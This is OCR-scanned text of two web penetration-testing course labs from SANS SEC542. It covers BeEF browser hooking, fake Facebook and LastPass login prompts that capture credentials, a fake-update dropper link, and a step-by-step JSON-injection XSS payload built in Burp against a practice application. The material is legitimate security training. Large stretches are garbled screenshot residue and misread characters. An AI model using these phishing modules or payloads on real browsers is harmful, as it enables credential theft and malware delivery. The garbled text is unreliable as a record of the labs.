Why does Chromium list other browsers and browser technologies in its user-agent? The reason is 
compatibility: 
And then Google built Chrome, and Chrome used Webkit, and it was like Safari, and wanted pages built 
for Safari, and so pretended to be Safari. And thus Chrome used WebKit, and pretended to be Safari, 
and WebKit pretended to be KHTML, and KHTML pretended to be Gecko, and all browsers pretended to 
be Mozilla, and Chrome called itself Mozilla/5.0 {Windows; U; Windows NT 5.1; en-US) 
AppleWebKit/525.13 {KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13, and the user agent string 
was a complete mess, and near useless, and everyone pretended to be everyone else, and confusion 
abounded.1 
\.._/ 
.'-" 
'----' 
'-' 
'-..,, 
'----' 
'--' 
\.._/ 
\.._/ 
\.._/ 
\.._/ 
\.._/ 
\.._/ 
\.._/ 
'--' 
'----' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
4 
'--' 
'-..,, 
'--' 
Widen That Browser! 
Be sure your Firefox browser is maximized wide enough to show four columns. You may narrow some of 
,----._ 
the columns to make this happen. 
Click the BeEF Commands tab and drill down and select any command. You must have the fourth column 
shown on this slide to support required command inputs, Execute functionality, and so on. 
~-) (j) 127.o.o,. 1 :3000/ul/panel 
~Exercises • f Mutillidae ~ bWAf'P ll,ID\/'WA 
- EeEF 0.4.7.0-alpha 
I Submit Bug 
I ~ 
[
~· 6J ~nli·ne
· ·. Bra.
.·'_'". ers 
" a www.sec542.org 
fl": 
ilfJ 192.100.l.8 
L] Offline Browsers 
Hooked Browsers 
" i;jj Browser (2) 
" i;jj Hooked Domain (2) 
fl Create Prompt Di!IDg 
,. i;jJMi.sc (1) 
Create !!wtsible !frame 
"' '::;J Persistence {2) 
Ii Create Foregmurr.r! iFrame 
Iii Create Pop UI1de1 
" i;jj Pooooi,ap (1) 
'iii/Alert User 
Alertte.,t: 
12.7 
Note: Make sure you can see the fourth column, which is critical for issuing zombie commands. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
5 
1' 
Hooked Browser Commands 
Explore the available commands. 
.,, e5J Browser (52) 
.,, 8 Hook.ed Domaln (24) 
Get Cookie 
Get Form Values 
'iJ Get Page HREFs 
c;;, Get Pa:ge HTML 
". Get Page and ifrnme HTML 
Remove stuck iframe 
Replace HREFs 
Repla,ce HREFs {Cftck Events) 
Repla,ce HREFs {HTTPS) 
Replace HREFs (TEL) 
Fingerprint Ajax 
Overflow Cookie .Jar 
Create Ale.rt Diatfog 
Create Prompt Dialog 
u Redirect Browser 
From the Getting Started tab: 
Each command module has a traffic light icon, which is used to indicate the following: 
• 
Green: The command module works against the target and should be invisible to the user. 
• 
Orange: The command module works against the target but may be visible to the user. 
• 
White: The command module is yet to be verified against this target. 
• 
Red: The command module does not work against this target. 
E:ach comrrmnd rnodule has a traffic light icon, v1hich :is used to :indicate the folklvling: 
The commaoo lllOdule works agaillSt the target and 
be :irr11isible to the user 
The command! :lllOdu'le works against the target, but ITIBi}f be v.isible to the user 
The commaoo module is yet to be veriified agaillSt this target 
(I The command moouile does not wonk against this target 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
'v 
'v 
1 
'-....,/ 
\____., 
l__, 
I '-.J 
L, 
L, 
L, 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
L 
~ 
~ 
~ 
l, 
J, 
J, 
l, 
j_, 
_1, 
J_, 
j_, 
6 
J_, 
l 
l, 
I Challenge: No Hints 
Perform the following actions on the hooked Chromium browser: 
• 
Trigger alert dialog 
• 
Show prompt dialog 
• 
Play a sound 
• 
Redirect the browser 
• 
Steal Facebook and LastPass credentials 
Note: Directing the browser away from the page executing BeEF's hook.js will cause the browser to be 
unhooked and show up as offline. Click the "OMG Cute Bunny" bookmark to rehook the browser. 
Note: It may take 5 to 8 seconds or so for the commands to execute in Chromium. 
You may attempt these challenges on your own, or step-by-step instructions begin on the next page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
7 
lstep-1,y-Step Instructions 
\..../ 
Alerts Dialog 
\..../ 
Go to Firefox: Command-> Browser-> Hooked Domain-> Create Alert Dialog 
• 
Enter a witty message in the Alert Text box and click Execute. 
• 
Widen Firefox if you can't see the Alert Text box. 
Create Alert Dialog 
Description: 
Id: 
Alert text: 
Sends an alert dialog to the hooked browser. 
127 
common mistake that people make when trying to 
design something completely foolproof is to underestimate 
the ingenuity of complete fools.\" \r-J:::ord Prefect 
Switch to Chromium to see your handiwork: 
• 
Sometimes, the command takes a little while to pop. 
• 
You must click OK for the next command to work. 
'-.../ 
'---' 
'---' 
\..../ 
\..../ 
\..../ 
\..../ 
'---' 
'---' 
'---' 
\..../ 
'---' 
'---' 
\..../ 
'----' 
'-..-/ 
www.sec542*org says: 
X 
"A common ml.stake that people make when trying to 
completely foolproof Is to 
ingenuity of complete fools." 
-ford Prefect 
Prevent this page from creating additional dialogs. 
'----' 
\..../ 
\..../ 
.'-../ 
'-../ 
'-' 
'-../ 
\..../ 
\..../ 
Note: Be sure to always complete the previous command before moving to the next. It's not unusual for 
impatient testers to have a half-dozen pop-ups queued up, which then pop one right after the other (after 
a short initial delay). 
\..../ 
\..../ 
'-.../ 
'-' 
'-' 
\..../ 
'-../ 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
8 
'-' 
\..../ 
'---' 
Prompt Dialog 
Firefox: Command-> Browser-> Hooked Domain-> Create Prompt Dialog 
~ 
• 
Enter a witty question in the Prompt Text box and press Execute 
,,.....__ 
Chromium: Enter an answer and click OK. 
www.sec54Z:org says: 
Firefox: Go to module results history and double-click the command to see what the user entered. 
ii 
li td• 
Command results 
2018-01-20 15:37 
command 1 
1 
Play a Sound 
Note: Your speakers must be on, and the Security542 VM must have virtual access to sound. 
"' 
Firefox: Command -> Browser-> Play Sound-> Execute 
Des,criptfon: 
let 
Sound File 
Path: 
Play a sound on the hooked browser. 
100 
ilnp:/J0.0.0.0:3000/demos/new_zombie.mp3 
Wait for 5+ seconds, and the sound will play (no need to switch to Chromium). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
9 
Redirect the Browser 
Let's send Chromium to the SANS Portal login page: 
• 
We take security seriously! 
Firefox: Command -> Browser-> Hooked Domain -> Redirect Browser 
• 
Redirect URL: http:/ /127. O. O .1/www.sans.org/account/ 
• 
Then, click Execute. 
Note: Chromium becomes unhooked after it leaves the BeEF injection page. 
Chromium: View the login page. 
Neu.1 
fJ'!t.'llf AQtif¾SS 
Er'nWlMUt~ 
P~'isswcrct 
Pa%WUm 
Koop rrw !oij,gerl ,n ftlr seven oays 
.. 
Corifftrrt ~tletO 
Mll!Hli!I 
Chromium: Be sure to click the "OMG Cute Bunny" bookmark at the top left to become re-hooked. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
\._,I 
'--' 
'--' 
'--' 
'--' 
'-' 
'-.J 
'--' 
'-.J 
'--' 
'--' 
'--' 
'-' 
'--' 
'-./ 
'-' 
'--' 
'--' 
'-.J 
'--' 
'--' 
'-.J 
'--' 
'--' 
'-.J 
'--' 
'-' 
'-.J 
'--' 
'-.../ 
'--' 
'-.J 
'--' 
'--' 
'-.../ 
'--' 
'-.../ 
'--' 
'-.J 
10 
'--' 
'-.J 
'--' 
Let's Steal Some Credentials! 
BeEF has Social Engineering modules designed to trick a user into entering their: 
• 
Facebook password 
• 
LastPass password 
• 
Gmail password 
• 
And more! 
Let's start with Facebook: In Firefox go to Social Engineering-> Pretty Theft 
t> CJ &~er (54) 
~ Q Chrome Extensoos (6) 
C> u Oebug (9) 
!> Q Ext*Jlls (97) 
t> CJHost(22) 
!~ r::J!PEC (9) 
~ a Metasploil c1> 
'> CJ Misc (15) 
;> QN~k(21) 
I• CJ Pt!!fsiste-oce (6) 
;.> CJ PhoneQIIIP (16) 
4 ej Social Enginee:rng (24) 
Texn,~e 
-., Clokj9ckl'IQ 
GCffl' 
• Fake Evemote 'Web Clipper Login 
• Fake Flash Upda!e 
., Fake tastPass 
• Fake NotiftCROO!i Bar 
• Fake Notification Bar (Chrc:xne) 
• Fake Notificatoo Bar (Fi'efox) 
,111 Fake Notificatoo Bar (IE) 
_, Google Phishing 
&lcamtl.lffi(r.,1ruoad 
f, Pl'eU)' Theft 
f; Replaee v~ (Fake Pllgin) 
Then click "Execute" 
Execute 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
11 
Switch to Chromium and enter fake credentials in the Facebook pop-up, and press "Log in": 
Your session Ms timed oot due to macwlty. 
Please re.enter your usemame and passwo rd to mgm. 
Email: ! adent 
j 
P~SS,\f,'iOt'd: 
'--' 
-._./ 
'-" 
'-" 
'--' 
'-" 
'-" 
'-.J 
'-" 
'--..,' 
'-" 
Switch back to Firefox and view the credentials. Go to "Module Results History" and click on the command. 
'--..,' 
'---' 
'-.J 
results 
0 
date 
2018-01-2016:02 
• Pretty Theft 
'-.J 
'---' 
'---' 
1vl 
. 
_J 
'---' 
! http://0.0.0.0:3000luifmedia/images!beef.png 
'---' 
'--' 
The username and password entered in Chromium will be shown: 
~ 
Command resuls 
data: MS\•1er=aoentTovrels! 
Jan 
'--' 
'---' 
'--' 
'-....,/ 
'-....,/ 
'--' 
'--..,' 
'-./ 
'---'' 
'-....,/ 
'--' 
'---' 
'---' 
'---' 
'--' 
'-- 
'---' 
'---' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
12 
'---' 
'---' 
'--" 
Now Let's Steal LastPass Credentials 
LastPass is a popular password vault. 
In Firefox: Go to Social Engineering-> Fake LastPass 
g.i C!ickjru:kfng 
,iC~ 
Fake Everoore Web Clij,i 
iiii, Fake Fmn Uptime 
;; fal(e Noolieelion Bat 
Fake No!Jficfllion i:lB 
8 Fake No!Jfication Bat 
Fake NotificatJoo Bat iii:) 
0 G~ Phis~ 
" 
Then click "Execute" 
" 
Switch to Chromium and enter fake credentials: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
13 
"--" 
'-..,,I 
Switch back to Firefox and view the LastPass credentials. 
\,,_J 
View the credentials in Firefox. Go to ''Module Results History" and click on the command. 
'-..,,I 
• BeEF OA 7 JJ.a!pha I Submil Buy ! Wl!lQlll 
I___, 
i i 
'-.../ 
Note that the Fake LastPass module works a bit differently than the Facebook "Pretty Theft" module: The 
Fake LastPass module appears to grab the username and password character-by-character, resulting in 
many lines of command output. You will see all of the entered data if you scroll down in the command 
window. The screenshot below shows the final data (see line 18 in the screenshot): username: zaphod, 
password: Brains! 
g 
n 
12 
13 
14 
15 
16 
17 
U! 
19 
2l} 
data: result=Passworrl l'ielCI changed to: B 
data: result=Password field changed to: B 
data: result=P:asswon:l fiel:cl changed to: Bra 
data: result=cPassword fiefd changed to: Bra 
data: result=Passwom field changed to: Brai 
data: result=Passwom iieid changed to: Brain 
data: result=Passwcm field changed to: Brains 
data: result=Passwrm:l field changed to: Brains! 
data: result=Passwom field changed to: Brains! 
data: meta=cK!llFRAME 
Sat Jan 20 2018 16:08:37 GMT-OEKlO (PST) 
Sat Jan 20 201816:08:37 GMT-0800 (PST) 
Sat Jan 20 2018 16:00:38 GMH}800 (PST) 
Sat Jan 20 2018 16:08:38 GMT-0300 (PST) 
Sat Jan 20 201816:00:39 Gf,ffOBOO (PST) 
Sat Jan 2D 2018 16:08:39 
(PST) 
Sa, Jan 20 2018 16:00:40 GMT-0000 (PST) 
Sal Jan 20 201816:0B:40 Gf,ff-0800 (PST) 
Sat Jan 20 2018 16:DB:41 GMT-0800 (PST) 
Sal Jan 2D 2018 16:00:41 GMT-0800 (PST) 
''-,/ 
''-,/ 
'-../ 
'-' 
data: result=Kiutng Frame 
'-' 
'--' 
'-../ 
'-../ 
'-' 
'-' 
'-' 
'-" 
'--' 
'-../ 
'--' 
'--' 
'-.../ 
'-.../ 
'-../ 
'-' 
'-../ 
'-../ 
'-..,,I 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
14 
'-.../ 
'-' 
'-J 
If You Have Time ... 
That wraps up this lab. 
You can freestyle for a bit and try other commands and see what works. Share any interesting and creative 
BeEF hacks with your instructor. 
You might want to try the following modules: 
• 
Social Engineering-> Fake Flash Update 
• 
Social Engineering-> Clippy 
Your bl'Cl\¥Ser apperus 
to be out Of date, 
Would you llke to 
upgrade. it? 
"' 
Clippy in Chromium on Linux? Yes, please! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
15 
'-" 
Note they both accept a link if the user clicks "Install" or "Yes" (Clippy defaults to: 
http: //0. 0. 0. 0: 3000/dropper. exe). 
So, these exploits are not yet weaponized but can be easily configured to deliver the executable payload of 
the penetration tester's choice. 
[Reference · 
[1] http://webaim.org/blog/user-agent-string-history/ (http://cyber.gd/511_ 454) 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
'--' 
'--' 
'--' 
'--' 
'--' 
'---' 
'--' 
'--' 
'--' 
'--' 
'-.../ 
'--' 
'--' 
'--' 
'-.../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-.../ 
'--' 
'--' 
'--' 
'--' 
'---' 
'---' 
'--' 
'--' 
'--' 
'--' 
'--' 
16 
v 
'--' 
'--' 
,,-.,, 
I Objectives 
• 
• 
• 
Perform an XSS exploit versus an AJAX JSON object 
Work through JSON parsing and syntax errors 
Use error messages to guide bypassing the error messages 
Lab Setup 
Launch Burp 
Launch Burp by clicking the Burp icon in the upper panel: 
Wait for Burp to launch. 
Run one instance of Burp only. Multiple instances of Burp are running if you see this warning: 
Your ternporaiy directoiy contains the foHowing foiders which appear to have been previously generated by Burp. would you like to delete these, 
Note: you should net delete these mes i! another ;nstance ol 8urp is: cunentty running. 
Wed Jan 17 08:26:$5 PST 2018 ;tmpJburp764,U<:lc16l330S329404.tmp 
Wed Jen 17 08:25:35 PST 201.8 ;tmp;burp1.458H8343269081906.tmp 
Wed Jan 17 08:26:35 PST 2018 ;tmp;burp:3975632966537475085.tmp 
In this case, choose Leave and then close the newest Burp instance, leaving the original. When in doubt, 
close all Burp instances and start over. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
1 
Warning: Burp must be listening on port 8082, and the Burp instance that generates the preceding error 
'-' 
cannot bind to port 8082 because it is in use by another instance. 
Open Firefox and then choose Burp in the Firefox Proxy Selector menu. 
'-' 
..,, 
SANS542 ·WehPen Testing and 1:thkai Had!.ing • Mozilla firnf-0x 
- + 
X 
- - - 
SANS Security 542 · Web Pe~ 
system Proxy 
Ethical Hae · g 
_ 
B 
;:1;'u,';eed 
~ I :;~L 
I 
, 
Zap 
~ 
1 
!Shellshock • netstat.cgi 
j ~ Manage Proxies 
1
1,_,_W~e~b~A~u~t~h~e~n~ti~ca~ti~· o~n~- ~B~a~Sl~
· c==1l. l,,-.. P f. 
r= 
: ·~ re erences 
, 
Web Authentication - Digest i.... .... ::. • 
· M - '" 
--1! 
'-' 
'-' 
.._., 
. .._., 
'-' 
'-' 
.._., 
..___, 
.._., 
.._., 
'-' 
'-' 
Refresh the page in Firefox to prime Burp: 
..___, 
www.sec542.org1 
• Burp~ 
MutilUdae "bWAPP r,JD\ANA 
..___, 
.._., 
.____,, 
'-' 
'-' 
Firefox 
..___, 
'-' 
Go to Exercises toolbar -> Mutillidae 
Then go to OWASP 2017 -> Al - Injection (Other)-> JavaScript Object Notation (JSON) Injection-> Pen Test 
Lookup (AJAX) 
.._., 
.._., 
.._., 
'-' 
.._., 
'-' 
.._., 
.._., 
.._., 
'-' 
..___, 
.._., 
.._., 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
2 
'---" 
.._., 
'-' 
g of vulnerabHltles 
Note: Be sure to choose the AJAX version of the tool! 
Choose any tool and click Lookup Tool. 
We use Dig (tool 16) in the following examples. 
Pen Test Tools 
"""""""se,~ Pen Test Tool 
) 
16 
Dig 
Reconnaissance 
DNS server 
Query Tool 
The Domain Information Groper is 
prefered on Linux over NSLookup and 
provides more information natively. 
NSlool<up must be in debug mode to 
give similar output. DIG can perform 
zone transfers if the DNS server 
allows transfers. 
In Burp: Go to Target-> Site Map-> http:/ /mutillidae -> mutillidae -> ajax -> lookup-pentest-tool.php 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
3 
View the Request. 
'--' 
GBcko/20100101 
.php 
showhints=O 
Note the body: Too11D=16 
Note: Your Tool ID will be different if you selected a different tool. 
The request body text is: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
'-J 
'--' 
,,__..., 
,,__..., 
'-.J 
'--' 
'--' 
'-.....- 
"'-.J 
'--' 
.'-.J 
'--' 
'-../ 
'-.....- 
'-...., 
'---' 
'--' 
'--' 
'-.J 
'--' 
\_/ 
'-.J 
"'-..../ 
'.._,/ 
'--' 
'-.J 
'--' 
'-../ 
'--' 
'-../ 
"'-.,/ 
'-./ 
'-../ 
'-./ 
4 
'-.J 
'-.....- 
'---' 
In Burp: Go to Target-> Site Map -> http://mutillidae -> mutillidae -> ajax -> lookup-pentest-tool.php 
View the matching Response. 
• rtlp:f/mutil!idae 
.. ft)/ 
D t,a"""'JitmJ 
lb r; ir,cl,;J,is 
1> E; inde><.php 
i, I: iavai«ipt 
·i:-::~ 
.. 
• 
Date: Tue, 00 Jan 2015 14:00:$4 G!"lf 
Server: Apache/2.4.7 (ubuntu) 
JH>owered·By: PHP/5. 5.9- lubuntu4.5 
Expires: Mon, 26 Jul 1997 05:00:00 GMT 
Cache-Control: no-cache, must-revalidate 
Pragma: no-cache 
Content-Length: 397 
Keep- Alive: timeout=5, max,,100 
Connection: Keep-Alive 
Content· Type: application/ j son 
{•query•: {•toot!ORequested•: •15•, •penTestTools•: 
[ {"too l_id": • 16", • tool._name•: •Dig•, •phase_to_use•: 'Reconnaissance•,• tool_type• 
:'ONS Server Query Tool•,•comment•:•The Domain Information Groper is prefered 
on Linux over NSLookup and provides more information natively. NSLookup must 
be in debug mode to gne similar output. DIG can perform zone transfers if 
the DNS server aHows transfers,•})}} 
,...__ 
Here is the matching response, with the JSON response in the body: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
5 
- 
Compare the Request Body: 
'--' 
'-.../ 
ToolID=16 • 
I 
'-.../ 
Compare with response body: 
'-../ 
'-' 
{"query": 
{ "toolIDRequested": 
"16", 
"penTestTools": 
[ { "tool_id": "16", "tool_name": "Dig", "phase_to_use": "Reconnaissance", "tool 
type":"DNS Server Query Tool","comment":"The Domain Information Groper 
is prefered on Linux over NSLookup and provides more information 
natively. NSLookup must be in debug mode to give similar output. DIG can 
perform zone transfers if the DNS server allows transfers."}]} 
Note: The arrows indicate input (and possible output) we control 
Our goal: Take control of the JSON object, beginning with the Tool ID number. We will complete the JSON 
object, add a JavaScript alert, and comment the remaining partial JSON object. 
'-' 
.'-..../ 
\....,./ 
'-' 
'-' 
'-../ 
\....,./ 
'-' 
'-..../ 
.__, 
'-.../ 
'-' 
.__, 
'---" 
'---" 
'---" 
,_; 
'-../ 
\....,./ 
'---" 
'---" 
'---" 
'---" 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-..,I 
'---" 
\....,./ 
..._,, 
'-../ 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
6 
'-../ 
'-../ 
\....,./ 
I challenge: No Hints 
Target:http://mutillidae/index.php?page=pen-test-tool-lookup-ajax.php 
Perform the following task: 
• 
Exploit an XSS flaw in the JSON AJAX object and create a JavaScript alert. 
You may stop here and attempt to perform this exercise with no hints. 
Limited hints are provided on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
7 
'---" 
!Challenge: LimitedHints 
\....., 
Target:http://mutillidae/index.php?page=pen-test-tool-lookup-ajax.php 
Perform the following task: 
Use Burp Intercept to perform XSS against the JSON AJAX object and create a JavaScript alert: 
• 
This is difficult: Building the XSS syntax one character at a time is recommended 
Focus on characters that are already in the JSON object: 
• I I (comment) is also helpful for ignoring trailing content 
Pay careful attention to all JSON errors: 
• 
They are quite helpful 
The next page has more hints, followed by step-by-step instructions beginning on the following page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
'--' 
'-..../ 
'-.J 
'-' 
'-' 
'-' 
'-' 
\....., 
'-' 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
,__., 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-..../ 
'-' 
'-..../ 
'-' 
'-' 
'-' 
\....., 
'-' 
'--.., 
'-.J 
8 
'-.J 
'-' 
'-.J 
Additional Exercise 
We are trying to prematurely complete the JSON object, insert a JavaScript alert, and ignore the remainder 
of the partial JSON object (which will probably trigger a syntax error if left unmolested). 
The goal: Take this JSON object: 
{"query": {"toolIDRequested": 
111611, 
"penTestTools": 
[{"tool id":"16","tool name":"Dig","phase to use":"Reconnaissance","t 
- 
- 
- - 
ool type":"DNS Server Query Tool","comment":"The Domain Information 
Groper is prefered on Linux over NSLookup and provides more 
information natively. NSLookup must be in debug mode to give similar 
output. DIG can perform zone transfers if the DNS server allows 
transfers."}]} 
Complete the JSON object after the tool number: 
• 
Somethinglike:{"query": {"toolIDRequested": 
111611}} 
Add a JavaScript alert 
Ignore the remainder with a comment: "/ /" 
You may stop here and attempt to perform this exercise or follow the step-by-step instructions that begin 
on the next page. 
"' 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
9 
jstep-by-Step Instructions 
Step 1 
Turn Burp Intercept on, choose a tool, and click Tool Lookup. 
Try to force an error by appending a double quote to the tool number. The JSON object uses double 
quotes, which is why we're trying double quotes before single. 
S e,::ju.enc>S!r I Ci.l!coder 
Extender I Options I Alerts 
Action 
POST /muti l Li dae/aj ax/lookup- pen- test- tool. php HTTP/ 1. 1 
Host: mutillidae 
User-Agent: Mozilla/5.0 [Xll; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0 
Accept: text/html, app lication/xhtml+xml, app lication/xml; 
. 9, */*; q=O, 8 
Accept-Language: en-US,en;q=0.5 
-Encoding: gzip, deflate 
Content-Type: application/x-W'ww-form-urlencoded; charset=LITF-8 
R.eferer: http://mutillidae/index.php7page=pen-test-tool-lookup-aJax.php 
Content-Length: 9 
Cookie: PHPSESSID=ln6618qgdjg84emfgh7p5krndJ2; showhints=O 
Connection: keep-alive 
Pragma: no-cache 
Cache-Control: no-cache 
ToolID=l6" 
Click Forward. 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
'-../ 
'-./ 
'-./ 
v 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'--' 
\..., 
'----' 
'----' 
'-._./ 
\..., 
'----' 
'-.../ 
'----' 
'----' 
'-.../ 
'----' 
'-" 
'-._./ 
'----' 
'-,I 
'----' 
'-" 
'----' 
'-" 
'----' 
'----' 
'----' 
'----' 
'-" 
'-" 
'----' 
'-,I 
'-" 
10 
'-" 
'-" 
'----' 
Step 2 
Go back to Firefox and view the result: 
property Hst JSON Res5X1nse: ("que 
"pen'lest'lbols•: 
"DNS 
ina:x 
mast bll in d•bug 
er allows 
Notice the extra double quote after the tool number in the error message: 
{"query": {"toolIDRequested": 
11161111, 
Note: The error says "Error Message: missing} after property list JSON Response" 
It suggests our next step to us: Append a "}". 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
11 
Step 3 
Burp: Keep intercept on for the remainder of the lab, and manually forward each request 
Firefox: Click Lookup Tool 
Burp: Change the ToollD to: ToolID=16"} and click Forward 
'-" 
'-" 
'-" 
'-J 
Firefox: View the result 
'-J 
'-" 
Message: missing 
after property list JSON Response: {"query": 
{"toollDRequested"; "16"}'", "penTestToels": 
[ {"tool_id" :"16" 1 "tool_name": "Dig", "phase_to_usen: "Reconnaissance", "tool_type":"DNS 
Server Query Tool'","comment":''The Domain Information Groper is prefered on 
over NSLookup and provides more information natively. NSLookup must be in debug 
mode to give similar output. DIG can perfOl'm z:one transfers if the DNS, server allows 
transfers."}]}} 
'-" 
'-../ 
'-" 
'-" 
'-J 
'-" 
We receive the same error as the last step: 
'-J 
Error Message: missing} after property list JSON Response:{"query": 
{"toolIDRequested": 
111611}11, 
"penTestTools": 
[{11tool_id11:11l611,"tool_name11:11Dig11,11phase_to_use11:11Reconnaissance11,11t 
ool_type":"DNS Server Query Tool","coIIIIIlent":"The Domain Information 
Groper is prefered on Linux over NSLookup and provides more 
information natively. NSLookup must be in debug mode to give similar 
output. DIG can perform zone transfers if the DNS server allows 
transfers."}]}} 
Our"}" did make it through, however. Let's follow the error and append another"}". Two"}" characters 
make sense, as they would balance the two "{" characters in the JSON object: 
{"query": {"toolIDRequested": 
111611} 
Another "}" would balance that part of the JSON object. 
'-../ 
'-../ 
'-" 
'-" 
'-../ 
'-----' 
'-" 
'-J 
'-" 
'-J 
'-----' 
'-../ 
'-" 
'-" 
'-../ 
'-../ 
'-../ 
'-../ 
'--' 
'-J 
'-.,/ 
'-" 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
12 
'--' 
'-----' 
'--' 
Step 4 
Firefox: Click Lookup Tool 
Burp: Change the ToollD to: ToolID=16 11}} 
• 
Press Forward 
Firefox: View the result 
[ {"taol_id·:" 
Sen,arQu 
01118r NSLookup and pravid•• mo 
mode to give simH•routputl. DtG 
al JSON Raapen111: {"query": 
"penTe91'.'ftla Is"~ 
use": "Reconnaissance• 
Information Groper is prefered 
in debug 
n if the DNS server allows 
A new error, which means we are making progress: 
Error Message: missing) in parenthetical JSON Response:{"query": 
{"toolIDRequested": 
111611}} 
11, "penTestTools": 
[{11tool_id":"l611,11tool_name":"Dig11,11phase_to_use11:11Reconnaissance11,"t 
ool type":"DNS Server Query Tool","comment":"The Domain Information 
Groper is prefered on Linux over NSLookup and provides more 
information natively. NSLookup must be in debug mode to give similar 
output. DIG can perform zone transfers if the DNS server allows 
transfers."}]}} 
The error itself is quite overt: 
Error Message: missing) in parenthetical JSON Response: 
We don't see an opening"(" in our object. It is probably part of the earlier AJAX code, which we don't see. 
Let's append a ")". 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
13 
....__,, 
Step 5 
Firefox: Click Lookup Tool 
Burp: Change the ToollD to: ToolID=l611}}} 
• 
Click Forward 
"---' 
"---' 
'----' 
Firefox: View the result 
'-..../ 
'----' 
Massage: missing: before statement JSON Response:{"query": 
{"toollDRequested": 
"penTestToois"; 
[ {0tool_idn:" 16", ''tool-name": "Dig", "'phase_to-use": "Rec:onnaissam::e", "to·ottype": "DNS 
Sin·ver Query T:ool","comment":"The Dom,ain Information Groper is pmered on Unux 
ookup and provides more information natively. t,SLookup must be in debug 
to give similar output. DIG can perform zone transfers if the DNS server allows 
transfers. 
'----' 
'----' 
'-...,/ 
'-..../ 
'-../ 
....__,, 
Another new (and helpful) error: 
'-../ 
Error Message: missing; before statement JSON Response:{"query": 
{11toolIDRequested11: 
111611}}} 11, 
11penTestTools11: 
[{11tool_id11:11l611,11tool_name11:11Dig11,11phase_to_use11:11Reconnaissance11,11t 
ool_type11:11DNS Server Query Tool11,11comment11:11The Domain Information 
Groper is prefered on Linux over NSLookup and provides more 
information natively. NSLookup must be in debug mode to give similar 
output. DIG can perform zone transfers if the DNS server allows 
transfers."}]}} 
The error message is specific once again: 
Error Message: missing; before statement JSON Response: 
Let's append a ";". 
This will hopefully complete the JSON object and allow insertion of a JavaScript alert. 
'----- 
'---' 
'----' 
'-../ 
'-../ 
'----' 
....__,, 
'---' 
'--./ 
"---' 
"---' 
'-../ 
'-../ 
"---' 
"---' 
'-../ 
'--./ 
....__,, 
'---' 
'----' 
'---' 
'--./ 
'----- 
'-..../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
14 
.__,,, 
'----' 
'----' 
Step 6 
Firefox: Click Lookup Tool 
Burp: Change the ToollD to: ToolID=l611}}} ; 
• 
Click Forward 
Firefox: View the result 
Response: {-quari,": 
"1&·}J,J;", "pan 
_ to _11:s:•'": "Rec::onn,aissanc:a'', ''tool 
made te, give similar output. DR'i cian parform zona tr.ansfar• i 
tran•fars."}]}} 
We got the same error as last time: 
Error Message: missing; before statement JSON Response:{11query11: 
{11toolIDRequested11: 
111611} }} ; 11, 
11penTestTools11: 
[{11tool_id11:11l611,11tool_name11:11Dig11,11phase_to_use11:11Reconnaissance11,11t 
ool type11:11DNS Server Query Tool11,11comment11:11The Domain Information 
Groper is prefered on Linux over NSLookup and provides more 
information natively. NSLookup must be in debug mode to give similar 
output. DIG can perform zone transfers if the DNS server allows 
transfers."}]}} 
This portion may stand on its own: { 11query11: 
{ 11 toolIDRequested11: 
1116 11}}}; 
The remainder of the JSON content may be causing us problems, so let's erase it by appending "/ /". 
This is the toughest part so far, and it's based on past experience combined with inference, plus a lot of 
testing with Burp. Sweat equity for the win! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
15 
Step 7 
'-..,I 
Firefox: Click Lookup Tool 
Burp: Change the ToollD to: ToolID=16"}}) ; / / 
• 
Press Forward 
\...., 
\...., 
\...., 
'-' 
Firefox: View the result 
'-...., 
'-...., 
Pen Test Tools 
'---' 
